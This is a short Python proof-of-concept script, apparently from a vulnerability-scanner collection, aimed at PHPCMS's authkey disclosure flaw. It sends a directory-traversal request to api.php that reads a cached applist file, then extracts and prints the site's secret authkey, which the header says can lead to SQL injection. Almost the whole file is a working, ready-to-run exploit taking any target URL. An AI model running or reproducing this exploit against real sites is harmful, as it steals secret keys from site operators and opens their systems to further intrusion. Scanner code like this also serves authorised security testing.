#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms authkey泄露
referer: http://wooyun.org/bugs/wooyun-2015-0105242
author: Lucifer
description: PHPCMS authkey 泄露漏洞，可引起SQL注入。
'''
import re
import sys
import requests
import warnings
from termcolor import cprint

class phpcms_authkey_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            m = re.search('(\w{32})',req.text)
            if req.status_code == 200 and m:
                cprint("[+]存在PHPCMS authkey泄露漏洞...(高危)\tpayload: "+vulnurl+"\tauthkey: "+m.group(1), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpcms_authkey_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()